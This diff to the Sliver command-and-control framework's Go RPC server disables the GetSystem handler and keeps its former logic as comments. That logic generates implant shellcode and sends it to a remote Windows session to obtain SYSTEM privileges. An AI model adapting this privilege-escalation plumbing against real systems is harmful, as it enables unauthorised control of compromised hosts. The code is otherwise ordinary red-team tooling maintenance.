@@ -20,14 +20,9 @@ package rpc
 
 import (
 	"context"
-	"io/ioutil"
 
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
-	"github.com/bishopfox/sliver/server/core"
-	"github.com/bishopfox/sliver/server/generate"
-
-	"github.com/golang/protobuf/proto"
 )
 
 // Impersonate - Impersonate a remote user
@@ -62,42 +57,44 @@ func (rpc *SliverServer) RevToSelf(ctx context.Context, req *sliverpb.RevToSelfR
 
 // GetSystem - Attempt to get 'NT AUTHORITY/SYSTEM' access on a remote Windows system
 func (rpc *SliverServer) GetSystem(ctx context.Context, req *clientpb.GetSystemReq) (*sliverpb.GetSystem, error) {
-	var shellcode []byte
-	session := core.Sessions.Get(req.Request.SessionID)
-	if session == nil {
-		return nil, ErrInvalidSessionID
-	}
 
-	shellcode, err := getSliverShellcode(req.Config.GetName())
-	if err != nil {
-		config := generate.ImplantConfigFromProtobuf(req.Config)
-		config.Name = ""
-		config.Format = clientpb.ImplantConfig_SHELLCODE
-		config.ObfuscateSymbols = false
-		shellcodePath, err := generate.SliverShellcode(config)
-		if err != nil {
-			return nil, err
-		}
-		shellcode, err = ioutil.ReadFile(shellcodePath)
-	}
-	data, err := proto.Marshal(&sliverpb.InvokeGetSystemReq{
-		Data:           shellcode,
-		HostingProcess: req.HostingProcess,
-		Request:        req.GetRequest(),
-	})
-	if err != nil {
-		return nil, err
-	}
+	return nil, nil
+	// var shellcode []byte
+	// session := core.Sessions.Get(req.Request.SessionID)
+	// if session == nil {
+	// 	return nil, ErrInvalidSessionID
+	// }
 
-	timeout := rpc.getTimeout(req)
-	data, err = session.Request(sliverpb.MsgInvokeGetSystemReq, timeout, data)
-	if err != nil {
-		return nil, err
-	}
-	getSystem := &sliverpb.GetSystem{}
-	err = proto.Unmarshal(data, getSystem)
-	if err != nil {
-		return nil, err
-	}
-	return getSystem, nil
+	// shellcode, err := getSliverShellcode(req.Config.GetName())
+	// if err != nil {
+	// 	config := generate.ImplantConfigFromProtobuf(req.Config)
+	// 	config.Name = ""
+	// 	config.Format = clientpb.ImplantConfig_SHELLCODE
+	// 	config.ObfuscateSymbols = false
+	// 	shellcodePath, err := generate.SliverShellcode(config)
+	// 	if err != nil {
+	// 		return nil, err
+	// 	}
+	// 	shellcode, err = ioutil.ReadFile(shellcodePath)
+	// }
+	// data, err := proto.Marshal(&sliverpb.InvokeGetSystemReq{
+	// 	Data:           shellcode,
+	// 	HostingProcess: req.HostingProcess,
+	// 	Request:        req.GetRequest(),
+	// })
+	// if err != nil {
+	// 	return nil, err
+	// }
+
+	// timeout := rpc.getTimeout(req)
+	// data, err = session.Request(sliverpb.MsgInvokeGetSystemReq, timeout, data)
+	// if err != nil {
+	// 	return nil, err
+	// }
+	// getSystem := &sliverpb.GetSystem{}
+	// err = proto.Unmarshal(data, getSystem)
+	// if err != nil {
+	// 	return nil, err
+	// }
+	// return getSystem, nil
 }
